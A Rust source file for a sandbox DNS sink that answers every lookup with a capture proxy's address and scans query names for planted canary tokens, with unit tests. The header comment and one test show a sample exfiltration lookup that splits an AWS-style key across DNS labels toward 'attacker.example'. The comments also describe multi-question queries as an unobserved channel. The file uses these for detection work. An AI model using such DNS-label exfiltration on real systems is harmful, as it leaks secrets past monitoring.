//! The DNS sink.
//!
//! Every name the guest asks for is answered with the capture proxy's own
//! address. Two things follow from that, and both are the point:
//!
//! - Whatever the artefact then connects to arrives at the proxy, where the
//!   request is decrypted and recorded. There is nowhere else for it to go.
//! - The question itself is evidence. DNS labels are a classic low-bandwidth
//!   exfiltration channel — a lookup for
//!   `AKIAIOSF.ODNN7EXA.MPLE.attacker.example` carries the payload in the
//!   question and never needs an answer at all. So every QNAME is scanned for
//!   planted tokens before any reply is composed.
//!
//! # Every query, not the first one
//!
//! A DNS message may carry more than one question. The convenient accessor for
//! "the query" returns an error rather than a list when there is more than
//! one, and a handler written against it would answer the message while
//! logging nothing — so a second question is a free, unobserved channel. This
//! module iterates the whole question section instead.

use std::net::Ipv4Addr;
use std::sync::Arc;

use chamber_evidence::{Channel, ObservationKind, Ordinal};
use hickory_proto::op::{Header, HeaderCounts, MessageType, Metadata, OpCode, ResponseCode};
use hickory_proto::rr::{RData, Record, RecordType, rdata::A};
use hickory_server::net::runtime::Time;
use hickory_server::net::xfer::Protocol;
use hickory_server::server::{Request, RequestHandler, ResponseHandler, ResponseInfo};
use hickory_server::zone_handler::MessageResponseBuilder;

use crate::CanarySet;
use crate::recorder::Recorder;

/// How long a sink answer is valid for.
///
/// Deliberately tiny. A cached answer is a lookup we never see, and an
/// unobserved lookup is a hole in the record.
const ANSWER_TTL_SECS: u32 = 1;

/// One question, as observed.
#[derive(Clone, PartialEq, Eq, Debug)]
pub struct ObservedQuery {
    pub qname: String,
    pub qtype: String,
}

/// Extract every question from a raw DNS message.
///
/// Shared with the proxy: a DNS-over-HTTPS request carries this exact wire
/// format in its body, so tunnelling a lookup through the proxy gets it read
/// the same way rather than passing as an opaque blob.
pub fn questions_from_wire(bytes: &[u8]) -> Option<Vec<ObservedQuery>> {
    // The source address is irrelevant to decoding and is never recorded from
    // here; a DoH body has no datagram to take one from.
    let placeholder = std::net::SocketAddr::from(([0, 0, 0, 0], 0));
    let request = Request::from_bytes(bytes.to_vec(), placeholder, Protocol::Udp).ok()?;
    Some(questions_of(&request))
}

/// Every question in a request, in the order they appear.
fn questions_of(request: &Request) -> Vec<ObservedQuery> {
    request
        .queries
        .queries()
        .iter()
        .map(|q| ObservedQuery {
            qname: q.name().to_string(),
            qtype: q.query_type().to_string(),
        })
        .collect()
}

/// Answers every name with the proxy's address, and records the asking.
pub struct DnsSink {
    recorder: Arc<Recorder>,
    canaries: CanarySet,
    answer_with: Ipv4Addr,
}

impl DnsSink {
    pub fn new(recorder: Arc<Recorder>, canaries: CanarySet, answer_with: Ipv4Addr) -> Self {
        Self {
            recorder,
            canaries,
            answer_with,
        }
    }

    /// Record every question in the message.
    ///
    /// Separated from the response path and callable on a `Request` built
    /// straight from bytes, so the observation behaviour is testable without
    /// binding a socket.
    pub fn observe(&self, request: &Request) -> Vec<Ordinal> {
        request
            .queries
            .queries()
            .iter()
            .map(|q| {
                // `original()` keeps the case the guest actually sent. The
                // lowered form is a normalisation for resolution, and the
                // bundle should record the question as asked.
                let qname = q.original().name().to_string();
                let hits = self.canaries.scan_dns_name(&qname);

                self.recorder.note(
                    Channel::DnsResolution,
                    ObservationKind::NameQuery {
                        qname: qname.clone(),
                        qtype: q.query_type().to_string(),
                        answered_with: self.answered_with(q.query_type()),
                    },
                    hits,
                )
            })
            .collect()
    }

    /// What this sink will say, if anything.
    fn answered_with(&self, qtype: RecordType) -> String {
        match qtype {
            RecordType::A => self.answer_with.to_string(),
            // Everything else gets an empty NOERROR. Recorded as such, rather
            // than left blank, so a reader can tell "we declined to answer"
            // from "we did not see it".
            _ => "no-records".to_owned(),
        }
    }
}

#[async_trait::async_trait]
impl RequestHandler for DnsSink {
    async fn handle_request<R: ResponseHandler, T: Time>(
        &self,
        request: &Request,
        mut response_handle: R,
    ) -> ResponseInfo {
        // Observe first. If composing or sending the reply fails, the question
        // is already recorded — the asking is the evidence, and an answer the
        // guest never receives does not make the lookup un-happen.
        self.observe(request);

        let builder = MessageResponseBuilder::from_message_request(request);
        let mut metadata = Metadata::new(request.metadata.id, MessageType::Response, OpCode::Query);
        metadata.authoritative = true;
        metadata.response_code = ResponseCode::NoError;

        let answers: Vec<Record> = request
            .queries
            .queries()
            .iter()
            .filter(|q| q.query_type() == RecordType::A)
            .map(|q| {
                Record::from_rdata(
                    q.name().into(),
                    ANSWER_TTL_SECS,
                    RData::A(A(self.answer_with)),
                )
            })
            .collect();

        let response = builder.build(metadata, answers.iter(), [], [], []);

        match response_handle.send_response(response).await {
            Ok(info) => info,
            // A failed send is a delivery problem, not an observation problem:
            // the question is already in the ledger, and an answer the guest
            // never receives does not make the lookup un-happen.
            Err(_) => {
                let mut failed =
                    Metadata::new(request.metadata.id, MessageType::Response, OpCode::Query);
                failed.response_code = ResponseCode::ServFail;
                ResponseInfo::from(Header {
                    metadata: failed,
                    counts: HeaderCounts::default(),
                })
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{Canary, CanarySet};
    use hickory_proto::op::{Message, Query};
    use hickory_proto::rr::Name;
    use hickory_proto::serialize::binary::BinEncodable;
    use std::str::FromStr;

    const TOKEN: &str = "AKIAIOSFODNN7EXAMPLE";
    const SINK: Ipv4Addr = Ipv4Addr::new(10, 66, 0, 10);

    fn canaries() -> CanarySet {
        CanarySet::new(vec![Canary::new("aws-key", TOKEN)])
    }

    /// Build a real DNS query message and hand it over as a `Request`, exactly
    /// as the server would after reading a datagram.
    fn request_for(names: &[(&str, RecordType)]) -> Request {
        let mut message = Message::query();
        message.metadata.id = 42;
        for (name, rtype) in names {
            message.add_query(Query::query(Name::from_str(name).unwrap(), *rtype));
        }
        let bytes = message.to_bytes().unwrap();
        Request::from_bytes(bytes, "10.66.0.9:5353".parse().unwrap(), Protocol::Udp)
            .expect("a well-formed query must parse")
    }

    fn sink(recorder: &Arc<Recorder>) -> DnsSink {
        DnsSink::new(Arc::clone(recorder), canaries(), SINK)
    }

    #[test]
    fn a_lookup_is_recorded_with_the_address_it_was_given() {
        let r = Arc::new(Recorder::new());
        sink(&r).observe(&request_for(&[("collector.example.", RecordType::A)]));

        let obs = r.observations();
        assert_eq!(obs.len(), 1);
        match obs[0].kind() {
            ObservationKind::NameQuery {
                qname,
                qtype,
                answered_with,
            } => {
                assert_eq!(qname, "collector.example.");
                assert_eq!(qtype, "A");
                assert_eq!(answered_with, "10.66.0.10");
            }
            other => panic!("expected a name query, got {other:?}"),
        }
    }

    /// The hazard this module exists to avoid: a message with two questions
    /// must not log one and answer both.
    #[test]
    fn every_question_in_a_multi_query_message_is_recorded() {
        let r = Arc::new(Recorder::new());
        sink(&r).observe(&request_for(&[
            ("first.example.", RecordType::A),
            ("second.example.", RecordType::A),
            ("third.example.", RecordType::TXT),
        ]));

        let names: Vec<String> = r
            .observations()
            .iter()
            .map(|o| match o.kind() {
                ObservationKind::NameQuery { qname, .. } => qname.clone(),
                other => panic!("expected a name query, got {other:?}"),
            })
            .collect();

        assert_eq!(
            names,
            vec!["first.example.", "second.example.", "third.example."]
        );
    }

    /// The convenient single-query accessor errors on this message. A handler
    /// written against it would observe nothing at all — which is what makes
    /// the multi-query path a free channel rather than a rounding error.
    #[test]
    fn the_single_query_accessor_really_does_fail_here() {
        let request = request_for(&[
            ("first.example.", RecordType::A),
            ("second.example.", RecordType::A),
        ]);
        assert!(
            request.request_info().is_err(),
            "if this starts succeeding, the multi-query iteration may no longer be load-bearing"
        );
    }

    /// DNS labels carry the payload; no answer is needed for the leak to have
    /// happened.
    #[test]
    fn a_token_split_across_labels_is_a_witness() {
        let r = Arc::new(Recorder::new());
        sink(&r).observe(&request_for(&[(
            "AKIAIOSF.ODNN7EXA.MPLE.attacker.example.",
            RecordType::A,
        )]));

        let obs = r.observations();
        assert_eq!(obs.len(), 1);
        assert!(
            obs[0].is_witness(),
            "a label-joined token must support a finding: {:?}",
            obs[0].canary_hits()
        );
    }

    #[test]
    fn an_ordinary_lookup_is_recorded_but_is_not_a_witness() {
        let r = Arc::new(Recorder::new());
        sink(&r).observe(&request_for(&[("docs.example.", RecordType::A)]));

        let obs = r.observations();
        assert_eq!(obs.len(), 1);
        assert!(!obs[0].is_witness());
    }

    #[test]
    fn a_non_a_query_records_that_it_was_declined() {
        let r = Arc::new(Recorder::new());
        sink(&r).observe(&request_for(&[("mail.example.", RecordType::MX)]));

        match r.observations()[0].kind() {
            ObservationKind::NameQuery { answered_with, .. } => {
                assert_eq!(answered_with, "no-records");
            }
            other => panic!("expected a name query, got {other:?}"),
        }
    }

    /// The proxy reuses this to read a DNS-over-HTTPS body rather than
    /// treating it as an opaque blob.
    #[test]
    fn questions_are_recoverable_from_a_raw_wire_message() {
        let mut message = Message::query();
        message.add_query(Query::query(
            Name::from_str("tunnelled.example.").unwrap(),
            RecordType::A,
        ));
        let bytes = message.to_bytes().unwrap();

        let qs = questions_from_wire(&bytes).expect("a valid message must decode");
        assert_eq!(
            qs,
            vec![ObservedQuery {
                qname: "tunnelled.example.".into(),
                qtype: "A".into()
            }]
        );
    }

    #[test]
    fn garbage_is_not_mistaken_for_a_dns_message() {
        assert!(questions_from_wire(b"this is not dns").is_none());
    }
}
